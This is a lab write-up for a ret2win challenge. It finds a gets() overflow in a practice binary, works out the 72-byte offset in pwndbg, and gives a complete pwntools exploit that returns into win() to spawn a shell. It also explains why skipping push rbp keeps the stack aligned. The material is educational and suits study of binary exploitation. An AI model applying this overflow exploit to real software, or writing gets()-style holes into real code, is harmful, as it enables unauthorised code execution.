# Lab 1 Writeup - Ret2Win

When we run our [challenge binary](vuln), we are greated with the following message:

    ┌─[owen@parrot]─[~/Desktop/Binex-BOIL-TechX/lab_1]
    └──╼ $./vuln 
    Jump to the win function!

We are prompted for input and if we provide an input that's sufficiently large, the program will crash.

    ┌─[owen@parrot]─[~/Desktop/Binex-BOIL-TechX/lab_1]
    └──╼ $./vuln 
    Jump to the win function!
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Segmentation fault
    ┌─[✗]─[owen@parrot]─[~/Desktop/Binex-BOIL-TechX/lab_1]
    └──╼ $

Taking a look at the [C code](vuln.c), we notice that in the **vuln** function the program uses **gets()** to take in user input with no limit on size, and stores that input in a 64 byte buffer.

    void vuln() {
        char buffer[64];

        puts("Jump to the win function!");
        gets(buffer); 
    }

This allows us to modify data on the stack, by proving an input greater than 64 bytes.

from the C code, we can also observe that there is a win() function, that makes a system call to /bin/sh.

    void win() {
        puts("Execution successfully redirected!");
        system("/bin/sh"); 
    }

Out goal will be to redirect execution to this win() function.

In pwndbg, we can disassemble vuln(), and add a break point sometime after our input gets read in.

    pwndbg> disass vuln
    Dump of assembler code for function vuln:
        0x00000000004011dc <+0>:	push   rbp
        0x00000000004011dd <+1>:	mov    rbp,rsp
        0x00000000004011e0 <+4>:	sub    rsp,0x40
        0x00000000004011e4 <+8>:	lea    rax,[rip+0xe48]        # 0x402033
        0x00000000004011eb <+15>:	mov    rdi,rax
        0x00000000004011ee <+18>:	call   0x401030 <puts@plt>
        0x00000000004011f3 <+23>:	lea    rax,[rbp-0x40]
        0x00000000004011f7 <+27>:	mov    rdi,rax
        0x00000000004011fa <+30>:	mov    eax,0x0
        0x00000000004011ff <+35>:	call   0x401050 <gets@plt>
        0x0000000000401204 <+40>:	nop
        0x0000000000401205 <+41>:	leave
        0x0000000000401206 <+42>:	ret
    End of assembler dump.
    pwndbg> break *vuln+40
    Breakpoint 1 at 0x401204

When we run the binary, we can supply any small input and then inspect the stack layout.

    pwndbg> run
    Starting program: /home/owen/Desktop/Binex-BOIL-TechX/lab_1/vuln 
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    Jump to the win function!
    AAAAAAAAAAAAAAA

    Breakpoint 1, 0x0000000000401204 in vuln ()
    LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA

    pwndbg> stack 10
    00:0000│ rax rsp 0x7fffffffdad0 ◂— 'AAAAAAAAAAAAAAA'
    01:0008│-038     0x7fffffffdad8 ◂— 0x41414141414141 /* 'AAAAAAA' */
    02:0010│-030     0x7fffffffdae0 —▸ 0x7fffffffdc38 —▸ 0x7fffffffdfe5 ◂— '/home/owen/Desktop/Binex-BOIL-TechX/lab_1/vuln'
    03:0018│-028     0x7fffffffdae8 —▸ 0x7fffffffdb10 —▸ 0x7fffffffdb20 ◂— 1
    04:0020│-020     0x7fffffffdaf0 ◂— 0
    05:0028│-018     0x7fffffffdaf8 —▸ 0x7fffffffdc48 —▸ 0x7fffffffe014 ◂— 'SHELL=/bin/bash'
    06:0030│-010     0x7fffffffdb00 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401120 (__do_global_dtors_aux) ◂— endbr64 
    07:0038│-008     0x7fffffffdb08 —▸ 0x4011b4 (setup+94) ◂— nop 
    08:0040│ rbp     0x7fffffffdb10 —▸ 0x7fffffffdb20 ◂— 1
    09:0048│+008     0x7fffffffdb18 —▸ 0x40121f (main+24) ◂— lea rax, [rip + 0xe27]

Notice, our input 'AAAAAAAAAAAAAAA' sits at address **0x7fffffffdad0** and the return address for this stack frame, sits at address **0x7fffffffdb18**, at an offset of +8 from the base pointer.

We can now create a payload that fills this space on the stack, and modifies the return address!

Of course, we will need to know what address to jump to, and for that we can disassemble win()

    pwndbg> disass win
    Dump of assembler code for function win:
        0x00000000004011b7 <+0>:	push   rbp
        0x00000000004011b8 <+1>:	mov    rbp,rsp
        0x00000000004011bb <+4>:	lea    rax,[rip+0xe46]        # 0x402008
        0x00000000004011c2 <+11>:	mov    rdi,rax
        0x00000000004011c5 <+14>:	call   0x401030 <puts@plt>
        0x00000000004011ca <+19>:	lea    rax,[rip+0xe5a]        # 0x40202b
        0x00000000004011d1 <+26>:	mov    rdi,rax
        0x00000000004011d4 <+29>:	call   0x401040 <system@plt>
        0x00000000004011d9 <+34>:	nop
        0x00000000004011da <+35>:	pop    rbp
        0x00000000004011db <+36>:	ret
    End of assembler dump.

In our [exploit](exploit.py), we will return to the *second* instruction in the win() function, **0x00000000004011b8**

    from pwn import *

    p = process("./vuln")

    win_addr = 0x00000000004011b8
    buff_addr = 0x7fffffffdad0
    return_addr = 0x7fffffffdb18

    offset = return_addr - buff_addr

    payload = b"A" * offset + p64(win_addr)
    print(payload)

    p.recvuntil(b"Jump to the win function!")
    p.sendline(payload)
    p.interactive()


**Understanding the Payload**

We need to bridge the gap between our input buffer and the saved return address. By subtracting the buffer's starting address **0x7fffffffdad0** from the location of the saved return address **0x7fffffffdb18**, we calculate an exact offset of 72 bytes. Indeed, this makes perfect sense... it accounts for our 64-byte buffer plus the 8-byte saved base pointer (rbp). Our payload fills this 72-byte space with "A"s, putting us perfectly in position to overwrite the saved instruction pointer.

Next, we overwrite the return address with the location of our win function, packed into a 64-bit format using pwntools' p64().


**Why we Skip the Prolouge**

You might notice that instead of jumping to 0x4011b7 (the very first instruction of win), our exploit targets **0x4011b8**. This intentionally skips the first assembly instruction: *push rbp*.

This is a deliberate trick to fix a stack alignment issue specific to 64 bit Linux. When we hijack execution via a buffer overflow, we are forcefully returning (ret) into the function rather than using a standard call. Because we skipped the call instruction, our stack pointer (rsp) is out of phase by 8 bytes.

A standard call instruction pushes the return address onto the stack (which shifts the stack pointer down by 8 bytes), and then it jumps to the function.

The function prologue (push rbp; mov rbp, rsp) is designed with the assumption that this 8 byte shift just happened. It pushes the old base pointer (shifting the stack pointer by another 8 bytes, which restores the 16 byte alignment) and then anchors the new frame.

When we hijack the flow using ret, we are just popping a value into the instruction pointer and incrementing the stack pointer. Because we skipped the call, that initial 8 byte shift never happened. If we let the prologue run anyway, it pushes the base pointer and puts the entire alignment out of phase.

By skipping the prologue entirely, we keep the stack pointer aligned, allowing the system call to execute safely and grant us a shell.